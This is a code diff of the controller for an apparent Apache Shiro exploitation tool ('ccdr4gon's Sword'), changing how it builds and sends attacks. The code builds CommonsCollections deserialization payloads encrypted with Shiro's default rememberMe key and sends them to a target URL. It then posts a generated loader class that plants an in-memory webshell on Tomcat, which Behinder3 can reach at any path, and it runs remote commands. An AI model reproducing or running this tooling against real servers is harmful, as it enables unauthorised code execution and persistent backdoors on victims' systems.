@@ -76,12 +76,8 @@ public class Controller implements Initializable {
             else {
                 res=new String(res_bytes);
             }
-            String result=StringUtils.substringBefore(res,"=========end=========");
-            if(result.equals(res)){
-                ShiroTextArea.appendText("命令执行失败!\n");
-            }else {
-                ShiroTextArea.appendText(result);
-            }
+            res=StringUtils.substringBefore(res,"=========end=========");
+            ShiroTextArea.appendText(res);
         }catch (Exception e){
             e.printStackTrace();
         }
@@ -89,70 +85,104 @@ public class Controller implements Initializable {
 
     //inject
     public void ShiroInjectHandler(ActionEvent event) {
+        String initPayload;
         //get input
         byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
-        String middleware=ShiroMiddlewareBox.getValue().toString();
-        String chain=ShiroChainBox.getValue().toString();
         String url=ShiroURLField.getText();
         String pass=ShiroPassField.getText();
         boolean is_gcm=ShiroAlgorithm.isSelected();
-        String loadurl,shellurl;
 
 
 
 
-        try {
-            String initPayload=InitFactory.getpayload(middleware,chain,key,is_gcm);
-            String loadPayload=LoadFactory.getPayload(middleware,pass);
+        if(ShiroMiddlewareBox.getValue().equals("Tomcat8/9")){
+            try {
+                //generate payload
+                if(ShiroAlgorithm.isSelected()){
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(Init.class,pass);
+                    AesCipherService aes = new AesCipherService();
+                    ByteSource initciphertext = aes.encrypt(init, key);
+                    initPayload = "rememberMe=" + initciphertext;
+                }
+                else {
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(Init.class,pass);
+                    byte[] initciphertext = AesUtils.encrypt(init, key);
+                    initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext);
+                }
 
+                byte[] load= new ByteBuddy()
+                        .redefine(Load.class)
+                        .name("Load")
+                        .make()
+                        .getBytes();
 
-
-            HttpUtil.get(url, initPayload);
-
-            if (url.contains("?")) {
-                loadurl = url + "&stage=init";
-            } else {
-                loadurl = url + "?stage=init";
+                String loadPayload=Base64.getEncoder().encodeToString(load);
+                //inject
+                String loadurl;
+                HttpUtil.get(url,initPayload);
+                if(url.contains("?")){
+                    loadurl=url+"&stage=init";
+                }else {
+                    loadurl=url+"?stage=init";
+                }
+                HttpUtil.post(loadurl,"",loadPayload);
+                ShiroTextArea.appendText("注入完成\n");
+            }catch (Exception e){
+                e.printStackTrace();
             }
-
-            HttpUtil.post(loadurl, "", loadPayload);
-            ShiroTextArea.appendText("注入完成\n");
-
-            if (url.contains("?")) {
-                shellurl = url + "&stage=s";
-            } else {
-                shellurl = url + "?stage=s";
-            }
-
-            ShiroTextArea.appendText("冰蝎连接地址:\n"+shellurl+"\n");
-            ShiroTextArea.appendText("冰蝎连接密码:\n"+pass+"\n");
-
-        }catch (Exception e){
-            e.printStackTrace();
         }
+        else if(ShiroMiddlewareBox.getValue().equals("Tomcat7")){
+            try {
+                if(ShiroAlgorithm.isSelected()){
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(T7.class,pass);
+                    AesCipherService aes = new AesCipherService();
+                    ByteSource initciphertext = aes.encrypt(init, key);
+                    initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext.getBytes());
+                }
 
-
+                else {
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(T7.class,pass);
+                    byte[] initciphertext = AesUtils.encrypt(init, key);
+                    initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext);
+                    System.out.println(initPayload.length());
+                }
+                byte[] load= new ByteBuddy()
+                        .redefine(T7Load.class)
+                        .name("ccdr4gon.T7Load")
+                        .make()
+                        .getBytes();
+                String loadPayload= Base64.getEncoder().encodeToString(load);
+                //inject
+                HttpUtil.get(url,initPayload);
+                HttpUtil.post(url,"",loadPayload);
+                ShiroTextArea.appendText("注入完成\n");
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
     }
     @Override
     public void initialize (URL url, ResourceBundle rb)
     {
         ShiroWebShellManagerBox.setItems(FXCollections.observableArrayList("Behinder3"));
         ShiroMiddlewareBox.setItems(FXCollections.observableArrayList("Tomcat8/9","Tomcat7"));
-        ShiroChainBox.setItems(FXCollections.observableArrayList("CommonsCollectionsK1_1","CommonsCollectionsK1_1_For_CC4"));
         //default value
         ShiroKeyField.appendText("kPH+bIxk5D2deZiIxcaaaA==");
         ShiroWebShellManagerBox.setValue("Behinder3");
         ShiroMiddlewareBox.setValue("Tomcat8/9");
         ShiroPassField.appendText(generateRandomWord(16));
-        ShiroChainBox.setValue("CommonsCollectionsK1_1");
+        ShiroChainBox.setItems(FXCollections.observableArrayList("CommonsCollectionsK1_1","CommonsCollectionsK1_1_For_CC4","CommonsBeanutils"));
+
+
+
 
         //绑定事件
         ShiroInjectButton.setOnAction(this::ShiroInjectHandler);
         ShiroExecuteButton.setOnAction(this::ShiroExecuteHandler);
 
-        ShiroTextArea.appendText("ccdr4gon's Sword -- 俺寻思似乎能使的0.0.3版本\n");
+        ShiroTextArea.appendText("ccdr4gon's Sword 0.0.2 \n");
         ShiroTextArea.appendText("Tomcat包括SpringBoot的嵌入式Tomcat(默认Web容器),直接使用即可\n");
-        ShiroTextArea.appendText("使用方法:\n点击Inject注入,可以执行命令，并且此Tomcat能解析的任何路径都可以连接内存马(需要添加get参数stage=s)\n");
-        ShiroTextArea.appendText("==============================================================================================\n");
+        ShiroTextArea.appendText("使用方法:先点击Inject注入，然后可以执行命令，并且此Tomcat能解析的任何路径都可以连接冰蝎3\n");
+        ShiroTextArea.appendText("=================================================================================\n");
     }
 }
